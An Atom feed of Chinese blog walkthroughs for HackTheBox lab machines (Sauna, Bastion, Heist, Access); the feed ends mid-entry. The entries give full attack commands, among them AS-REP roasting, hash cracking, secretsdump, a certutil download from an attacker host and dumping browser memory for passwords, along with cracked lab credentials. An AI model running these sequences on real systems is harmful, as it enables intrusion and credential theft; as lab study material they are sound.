<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-03-20T10:13:07.727Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sauna-hackthebox</title>
    <link href="http://yoursite.com/2021/03/20/sauna-hackthebox/"/>
    <id>http://yoursite.com/2021/03/20/sauna-hackthebox/</id>
    <published>2021-03-20T07:14:18.000Z</published>
    <updated>2021-03-20T10:13:07.727Z</updated>
    
    <content type="html"><![CDATA[<p>有关域渗透的靶机<a id="more"></a></p><img src="/2021/03/20/sauna-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.175</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/sauna 10.10.10.175</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Sat Mar 20 14:48:57 2021 as: nmap -v -sC -sV -oA nmap/sauna 10.10.10.175</span></span><br><span class="line">Increasing send delay for 10.10.10.175 from 0 to 5 due to 12 out of 38 dropped probes since last increase.</span><br><span class="line">Nmap scan report for 10.10.10.175</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 988 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Egotistical Bank :: Home</span><br><span class="line">88/tcp   open  kerberos-sec?</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  tcpwrapped</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  tcpwrapped</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h00m35s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-20T13:51:16</span><br><span class="line">|<span class="emphasis">_  start_</span>date: N/A</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Sat Mar 20 14:52:45 2021 -- 1 IP address (1 host up) scanned in 228.60 seconds</span></span><br></pre></td></tr></table></figure><p>开启了挺多的服务，这里可以看到虽然有smb但是因为需要登录，所以没办法看共享文件夹，80端口有web服务，389端口上跑着ldap服务</p><h4 id="延伸知识"><a href="#延伸知识" class="headerlink" title="延伸知识"></a>延伸知识</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LDAP（轻型目录访问协议）是用于目录服务身份验证的开放和跨平台协议。</span><br><span class="line"></span><br><span class="line">LDAP提供了应用程序用于与其他目录服务服务器进行通信的通信语言。目录服务存储用户，密码和计算机帐户，并与网络上的其他实体共享该信息</span><br><span class="line"></span><br><span class="line">Active Directory是一种目录服务实现，可提供各种功能，例如身份验证，组和用户管理，策略管理等。</span><br><span class="line"></span><br><span class="line">Active Directory（AD）同时支持Kerberos和LDAP – Microsoft AD是迄今为止使用的最常见的目录服务系统</span><br></pre></td></tr></table></figure><p>通过AD的介绍，支持Kerberos，那就应该可以通过枚举用户来拿票了</p><h3 id="信息收集-amp-字典爆破"><a href="#信息收集-amp-字典爆破" class="headerlink" title="信息收集&amp;字典爆破"></a>信息收集&amp;字典爆破</h3><p><code>http://10.10.10.175/about.html</code>页面底部发现了部分员工的名字，构造成字典进行枚举</p><img src="/2021/03/20/sauna-hackthebox/1.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /htb/boxes/easy/sauna/user.txt -output /htb/boxes/easy/sauna/result.txt -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure><img src="/2021/03/20/sauna-hackthebox/2.png" class=""><h3 id="john"><a href="#john" class="headerlink" title="john"></a>john</h3><p>上面拿到了一个对应的账户和加密后的密码，上john</p><img src="/2021/03/20/sauna-hackthebox/3.png" class=""><h3 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23</span><br></pre></td></tr></table></figure><p>测试能不能用evil-winrm登录</p><img src="/2021/03/20/sauna-hackthebox/6.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.175 -u fsmith -p <span class="string">'Thestrokes23'</span></span><br></pre></td></tr></table></figure><p>登录之后读取user.txt</p><img src="/2021/03/20/sauna-hackthebox/4.png" class=""><h3 id="winPEAS-exe"><a href="#winPEAS-exe" class="headerlink" title="winPEAS.exe"></a>winPEAS.exe</h3><p>针对windows系统的漏洞扫描脚本</p><p>用upload上传到靶机，然后运行</p><img src="/2021/03/20/sauna-hackthebox/5.png" class=""><p>又爆出了一个账户，尝试登录，失败</p><p>查看存在的用户，返现是用户名错了</p><img src="/2021/03/20/sauna-hackthebox/7.png" class=""><p>更改之后登录成功</p><img src="/2021/03/20/sauna-hackthebox/8.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>待填</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175</span><br></pre></td></tr></table></figure><img src="/2021/03/20/sauna-hackthebox/9.png" class=""><p>爆出了administrator经过hash处理的密码，继续用evil-winrm登录</p><img src="/2021/03/20/sauna-hackthebox/10.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有关域渗透的靶机
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>bastion-hackthebox</title>
    <link href="http://yoursite.com/2021/03/19/bastion-hackthebox/"/>
    <id>http://yoursite.com/2021/03/19/bastion-hackthebox/</id>
    <published>2021-03-19T11:04:47.000Z</published>
    <updated>2021-03-19T13:48:21.757Z</updated>
    
    <content type="html"><![CDATA[<p>再次学习smb，学习挂载<a id="more"></a></p><img src="/2021/03/19/bastion-hackthebox/9.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.134</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/bastion 10.10.10.134</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Fri Mar 19 17:54:20 2021 as: nmap -v -sC -sV -oA nmap/bastion 10.10.10.134</span></span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 970 closed ports</span><br><span class="line">PORT      STATE    SERVICE          VERSION</span><br><span class="line">3/tcp     filtered compressnet</span><br><span class="line">22/tcp    open     ssh              OpenSSH for<span class="emphasis">_Windows_</span>7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)</span><br><span class="line">|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)</span><br><span class="line">|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)</span><br><span class="line">81/tcp    filtered hosts2-ns</span><br><span class="line">135/tcp   open     msrpc            Microsoft Windows RPC</span><br><span class="line">139/tcp   open     tcpwrapped</span><br><span class="line">445/tcp   open     microsoft-ds     Windows Server 2016 Standard 14393 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -19m24s, deviation: 34m37s, median: 34s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Bastion</span><br><span class="line">|   NetBIOS computer name: BASTION\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-03-19T11:14:27+01:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|<span class="emphasis">_  message_</span>signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-19T10:14:29</span><br><span class="line">|<span class="emphasis">_  start_</span>date: 2021-03-18T16:08:53</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Fri Mar 19 18:14:19 2021 -- 1 IP address (1 host up) scanned in 1199.34 seconds</span></span><br></pre></td></tr></table></figure><p>22端口的ssh，这里看到了smb服务，利用smbmap进行对共享驱动器的枚举</p><h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></table></figure><img src="/2021/03/19/bastion-hackthebox/1.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.134 -u anonymous</span><br></pre></td></tr></table></figure><img src="/2021/03/19/bastion-hackthebox/2.png" class=""><p><code>Backups</code>共享文件夹可以访问，挂载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups  mnt/backups</span><br></pre></td></tr></table></figure><img src="/2021/03/19/bastion-hackthebox/3.png" class=""><p>在文件夹下面有一个<code>note.txt</code>文件，里面给出了提示</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</span><br></pre></td></tr></table></figure><h3 id="vhd挂载"><a href="#vhd挂载" class="headerlink" title="vhd挂载"></a>vhd挂载</h3><p>接着在<code>WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351</code>下发现了vhd文件，相当于硬盘可挂载，这里挂载需要安装工具<code>libguestfs-tools</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /htb/boxes/easy/bastion/mnt/vhd/</span><br></pre></td></tr></table></figure><p>挂载需要很长的时间，就不贴图了</p><p>在挂载之后的<code>.config</code>文件可以找到账号和对应的哈希密码</p><img src="/2021/03/19/bastion-hackthebox/4.png" class=""><p>密码解密之后ssh登录拿到用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L4mpje：bureaulampje</span><br></pre></td></tr></table></figure><img src="/2021/03/19/bastion-hackthebox/5.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>发现了一个安装了的软件，一般情况下都会存在漏洞</p><img src="/2021/03/19/bastion-hackthebox/6.png" class=""><p><code>mRemoteNG</code>是一个开源的远程连接管理工具，有一个漏洞，可以通过配置文件获取用户的连接信息，配置文件存储在 AppData 文件夹</p><img src="/2021/03/19/bastion-hackthebox/7.png" class=""><p>可以看到管理员经过加密的密码，然后用[mRemoteNG-Decrypt][<a href="https://github.com/haseebT/mRemoteNG-Decrypt]工具解密密码" target="_blank" rel="noopener">https://github.com/haseebT/mRemoteNG-Decrypt]工具解密密码</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:thXLHM96BeKL0ER2</span><br></pre></td></tr></table></figure><p>最后用<code>impacket</code>中的脚本进行提权</p><img src="/2021/03/19/bastion-hackthebox/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;再次学习smb，学习挂载
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>heist-hackthebox</title>
    <link href="http://yoursite.com/2021/03/18/heist-hackthebox/"/>
    <id>http://yoursite.com/2021/03/18/heist-hackthebox/</id>
    <published>2021-03-18T12:38:21.000Z</published>
    <updated>2021-03-19T11:15:37.873Z</updated>
    
    <content type="html"><![CDATA[<p>有收获<a id="more"></a></p><img src="/2021/03/18/heist-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.149</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/heist 10.10.10.149</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Thu Mar 18 21:23:57 2021 as: nmap -v -sC -sV -oA nmap/heist 10.10.10.149</span></span><br><span class="line">Nmap scan report for 10.10.10.149</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">135/tcp open  tcpwrapped</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 34s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-18T13:26:21</span><br><span class="line">|<span class="emphasis">_  start_</span>date: N/A</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Thu Mar 18 21:26:15 2021 -- 1 IP address (1 host up) scanned in 137.56 seconds</span></span><br></pre></td></tr></table></figure><p>用masscan补扫全端口，nmap比较慢</p><img src="/2021/03/18/heist-hackthebox/1.png" class=""><p>5985是winrm远程登录</p><h3 id="信息收集-john解密"><a href="#信息收集-john解密" class="headerlink" title="信息收集/john解密"></a>信息收集/john解密</h3><p>打开是一个登录界面，有游客身份登录，登录之后是一段对话，用户名是Hazard，关于cisco路由器的问题，并且有一个附件</p><img src="/2021/03/18/heist-hackthebox/2.png" class=""><p>附件里面给出了几个用户名和密码，猜测数字7指的是7系密码</p><img src="/2021/03/18/heist-hackthebox/3.png" class=""><p>[解密网站][<a href="https://www.xiaopeiqing.com/cisco-password-cracker/]" target="_blank" rel="noopener">https://www.xiaopeiqing.com/cisco-password-cracker/]</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="variable">$uperP</span>@ssword</span><br><span class="line">Q4)sJu\Y8qz*A3?d</span><br></pre></td></tr></table></figure><p>上面还有一个 5系的密码，用<code>john</code>解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hac --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/2021/03/18/heist-hackthebox/4.png" class=""><p>现在到手的信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:admin、rout3r、Hazard</span><br><span class="line">pass:$uperP@ssword、Q4)sJu\Y8qz*A3?d、stealth1agent</span><br></pre></td></tr></table></figure><p>随机组合用户和密码尝试进行登录，失败</p><p>尝试5985端口的winrm远程登录，也失败了</p><p>可能是还有隐藏的用户名对应着上面的密码</p><h3 id="lookupsid-py利用"><a href="#lookupsid-py利用" class="headerlink" title="lookupsid.py利用"></a>lookupsid.py利用</h3><p>该脚本可以枚举更多用户，也是smb服务对应的impacket集成工具中的一个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 lookupsid.py hazard@10.10.10.149</span><br></pre></td></tr></table></figure><p>经过测试<code>stealth1agent</code>密码正确，成功枚举出更多用户</p><img src="/2021/03/18/heist-hackthebox/5.png" class=""><p>把所有用户整理成一个txt文件，密码整理成一个txt文件，避免一个个进行尝试，用工具跑</p><h3 id="crackmapexec枚举"><a href="#crackmapexec枚举" class="headerlink" title="crackmapexec枚举"></a>crackmapexec枚举</h3><p>安装<code>crackmapexec</code>工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.149 -u user.txt -p pass.txt</span><br></pre></td></tr></table></figure><img src="/2021/03/18/heist-hackthebox/6.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chase:Q4)sJu\Y8qz*A3?d</span><br></pre></td></tr></table></figure><p>上面这一个用户对应密码应该是能够成功的</p><h3 id="evil-winrm登录"><a href="#evil-winrm登录" class="headerlink" title="evil-winrm登录"></a>evil-winrm登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">'Q4)sJu\Y8qz*A3?d'</span></span><br></pre></td></tr></table></figure><img src="/2021/03/18/heist-hackthebox/7.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在用户的桌面发现了一个<code>todo.txt</code>文件</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#todo.txt</span></span><br><span class="line">Stuff to-do:</span><br><span class="line"><span class="bullet">1. </span>Keep checking the issues list.</span><br><span class="line"><span class="bullet">2. </span>Fix the router config.</span><br><span class="line"></span><br><span class="line">Done:</span><br><span class="line"><span class="bullet">1. </span>Restricted access for guest user.</span><br></pre></td></tr></table></figure><p>提到了会持续检查正在运行的类似进程的东西</p><p>ps查看发现多个firefox</p><p>管理员的账号信息可能保存在火狐日志里，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump.exe</a>读取火狐日志，尝试找登录信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.43/procdump64.exe procdump64.exe</span><br></pre></td></tr></table></figure><p>上传之后运行，会提示加参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\procdump64.exe -accepteula -ma 6720</span><br></pre></td></tr></table></figure><img src="/2021/03/18/heist-hackthebox/8.png" class=""><p>可以找到日志文件，然后下载很慢，上传一个string直接分析输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c <span class="string">"strings64.exe -accepteula firefox.exe_200520_084111.dmp &gt; info.txt"</span></span><br></pre></td></tr></table></figure><p>接着查找password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr <span class="string">"password"</span> ./info.txt</span><br></pre></td></tr></table></figure><img src="/2021/03/18/heist-hackthebox/9.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@support.htb：4dD!5&#125;x&#x2F;re8]FBuZ</span><br></pre></td></tr></table></figure><p>最后用<code>impacket</code>工具中的<code>psexec.py</code>进行提权拿shell</p><img src="/2021/03/18/heist-hackthebox/10.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有收获
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>access-hackthebox</title>
    <link href="http://yoursite.com/2021/03/18/access-hackthebox/"/>
    <id>http://yoursite.com/2021/03/18/access-hackthebox/</id>
    <published>2021-03-18T02:27:39.000Z</published>
    <updated>2021-03-18T05:13:28.697Z</updated>
    
    <content type="html"><![CDATA[<p>telnet&amp;runas&amp;Acces文件解析<a id="more"></a></p><img src="/2021/03/18/access-hackthebox/8.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.98</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/access 10.10.10.98</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Thu Mar 18 09:58:39 2021 as: nmap -v -sC -sV -oA nmap/access 10.10.10.98</span></span><br><span class="line">Nmap scan report for 10.10.10.98</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can't get directory listing: PASV failed: 425 Cannot open data connection.</span><br><span class="line">| ftp-syst: </span><br><span class="line">|<span class="emphasis">_  SYST: Windows_</span>NT</span><br><span class="line">23/tcp open  telnet?</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: MegaCorp</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Thu Mar 18 10:02:09 2021 -- 1 IP address (1 host up) scanned in 209.61 seconds</span></span><br></pre></td></tr></table></figure><p>21端口的ftp允许匿名登录</p><p>23端口开放了telnet服务，可以尝试远程连接</p><p>80端口web服务，访问只有一张图片</p><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p>ftp匿名登录之后，可以看到有两个文件夹，文件夹下都有一个文件，get下载到本地</p><img src="/2021/03/18/access-hackthebox/1.png" class=""><h3 id="access文件解析"><a href="#access文件解析" class="headerlink" title="access文件解析"></a>access文件解析</h3><p>file命令查看<code>backup.mdb</code>文件，是access文件</p><img src="/2021/03/18/access-hackthebox/2.png" class=""><p>用mdbtools</p><img src="/2021/03/18/access-hackthebox/3.png" class=""><p>拿到了三组密码，之前下载的另一个文件是一个压缩包，需要密码，这里刚好可以进行尝试</p><p>第二组密码可以解开压缩包</p><p>之后用<code>readpst</code>读取pst文件</p><img 